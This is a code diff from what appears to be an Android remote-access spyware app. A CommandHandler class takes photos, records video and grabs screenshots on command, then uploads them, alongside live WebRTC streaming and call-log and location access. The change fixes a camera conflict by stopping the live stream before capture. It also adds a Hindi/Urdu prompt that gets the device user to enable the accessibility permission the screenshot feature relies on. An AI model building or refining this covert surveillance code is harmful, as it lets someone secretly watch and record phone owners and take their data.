@@ -8,9 +8,10 @@ import android.content.pm.PackageManager
 import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraManager
 import android.location.Location
-import android.media.MediaRecorder
 import android.os.Build
 import android.os.Environment
+import android.os.Handler
+import android.os.Looper
 import android.os.VibrationEffect
 import android.os.Vibrator
 import android.provider.CallLog
@@ -76,16 +77,39 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     private fun takePhoto(front: Boolean, onDone: (String) -> Unit) {
-        CameraController(ctx).capturePhoto(front) { file, err ->
-            if (file != null) { uploadFile(file, "photo"); onDone("photo_ok") }
-            else onDone("photo_fail: $err")
+        // Stop WebRTC if active (camera conflict fix)
+        if (webrtc != null) {
+            webrtc?.stop()
+            webrtc = null
+            Handler(Looper.getMainLooper()).postDelayed({
+                CameraController(ctx).capturePhoto(front) { file, err ->
+                    if (file != null) { uploadFile(file, "photo"); onDone("photo_ok") }
+                    else onDone("photo_fail: $err")
+                }
+            }, 2000)
+        } else {
+            CameraController(ctx).capturePhoto(front) { file, err ->
+                if (file != null) { uploadFile(file, "photo"); onDone("photo_ok") }
+                else onDone("photo_fail: $err")
+            }
         }
     }
 
     private fun recordVideo(front: Boolean, duration: Int, onDone: (String) -> Unit) {
-        VideoRecorder(ctx).recordVideo(front, duration) { file, err ->
-            if (file != null) { uploadFile(file, "video"); onDone("video_ok") }
-            else onDone("video_fail: $err")
+        if (webrtc != null) {
+            webrtc?.stop()
+            webrtc = null
+            Handler(Looper.getMainLooper()).postDelayed({
+                VideoRecorder(ctx).recordVideo(front, duration) { file, err ->
+                    if (file != null) { uploadFile(file, "video"); onDone("video_ok") }
+                    else onDone("video_fail: $err")
+                }
+            }, 2000)
+        } else {
+            VideoRecorder(ctx).recordVideo(front, duration) { file, err ->
+                if (file != null) { uploadFile(file, "video"); onDone("video_ok") }
+                else onDone("video_fail: $err")
+            }
         }
     }
 
@@ -98,7 +122,10 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
     private fun takeScreenshot(onDone: (String) -> Unit) {
         val svc = ScreenshotService.instance
-        if (svc == null) { onDone("accessibility_not_enabled"); return }
+        if (svc == null) {
+            onDone("Accessibility_NOT_enabled. Settings > Accessibility > CSK4 ON karein")
+            return
+        }
         if (Build.VERSION.SDK_INT < 30) { onDone("needs_android_11"); return }
         svc.takeScreenshot { file, err ->
             if (file != null) { uploadFile(file, "screenshot"); onDone("ss_ok") }
